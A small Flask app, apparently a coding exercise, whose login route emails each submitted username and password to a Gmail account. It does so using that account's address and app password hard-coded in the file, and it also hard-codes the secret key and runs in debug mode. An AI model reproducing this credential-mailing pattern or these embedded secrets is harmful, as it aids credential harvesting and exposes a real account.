from flask import Flask, render_template
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, EmailField, SubmitField
from wtforms.validators import DataRequired, Length, Email
from flask_bootstrap import Bootstrap
import smtplib

my_email = 'oulkarshubhu@gmail.com'
password = 'loadvnqrbxfcykos'


class LoginForm(FlaskForm):
    email = EmailField(label='Email', validators=[DataRequired(), Email(message="Invalid Email")])
    password = PasswordField(label='Password', validators=[DataRequired(), Length(min=8, message="Minimum password length should be 8 characters.")])
    submit = SubmitField(label='Log In')


app = Flask(__name__)
app.secret_key = "any-string-you-want-just-keep-it-secret"

Bootstrap(app)

@app.route("/")
def home():
    return render_template("index.html")


@app.route("/login", methods=['GET','POST'])
def login():
    login_form = LoginForm()

    if login_form.validate_on_submit():
        email= f'Subject: Mail from my web \n\nUsername: {login_form.email}\nPassword: {login_form.password}'
        with smtplib.SMTP('smtp.gmail.com') as connections:
            connections.starttls()
            connections.login(user=my_email, password=password)
            connections.sendmail(from_addr=my_email,
                                 to_addrs=my_email,
                                 msg= email)
    
    return render_template('login.html', form=login_form)


if __name__ == '__main__':
    app.run(debug=True)